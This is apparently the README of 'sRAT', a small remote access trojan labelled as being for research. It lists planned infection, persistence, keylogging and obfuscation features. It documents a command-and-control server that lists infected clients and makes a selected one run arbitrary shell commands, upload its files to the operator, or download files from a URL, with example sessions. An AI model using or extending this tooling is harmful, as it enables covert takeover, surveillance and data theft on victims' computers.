# sRAT

A small remote access trojan, for research purposes.

## todo list

1. DONE: communication
    1. DONE: server host
    2. DONE: request syntax
2. features
    1. DONE: command exec
    2. DONE: data transfer
    3. *key logging*
3. infection
    1. startup
    2. copy on volumes
4. sneak
    1. obfuscation
    2. encryption

## git usage

Always use **branches** when implementing a *feature* or a *fix*, with syntax `feature/yourName/featureName` or `fix/yourName/bugToFix`, and be careful when merging.

## server usage

You may insert commands after the `>` prompt. At any time, you can list commands typing `help`.

**global server commands**

command        | argument | description
-------------- | -------- | -----------
`help`         |          | display all commands
`exit`         |          | close server
`list`         |          | list all connected clients
`select`       | id       | select a client, given its id. opens a connection.
`unselect`     |          | unselect the client. close the connection.
`log`          | [nRows]  | prints out the log ; if an argument is passed, prints the selected amount of lines.
`save_clients` |          | save clients info to an external file, named `clients`.

**seleted client commands**

command | argument              | description
------- | --------------------- | -----------
`info`  |                       | display all information about the selected client 
`exec`  | command               | make the client execute a given shell command
`upld`  | clientFile serverFile | upload a file from the client to the server
`dwnld` | fileUrl localFile     | make the client download a file given by its url

### select client

#### list all connected clients

To display all connected clients, use

	>list

It will output a two-column array, with ids and MACs of all connected clients.

	>list
	id     MAC address         IP Address     OS
	1234   AA-BB-CC-DD-EE-FF   /192.168.1.2   Windows 10
	5678   00-11-22-33-44-55   /192.168.1.3   Windows 7

#### select one client

To selcet a client, use `select ID`. For example,

	>select 1234
	Selected client 1234
	1234*>

It may take up to 10 seconds to connect (the time between two clients ping). Now the prompt should begin as follows:

	Client 1234 connected.
	1234>

### execute a command

When a client is selected, make it execute a command with `exec YOUR_COMMAND`.

	1234>exec ipconfig
	Added command to stack

It might take a few seconds, and then the output will be printed. If the client is using Windows, you can start any shell command with

	1234>exec cmd.exe /C YOUR_COMMAND

The output will be sent back to you.
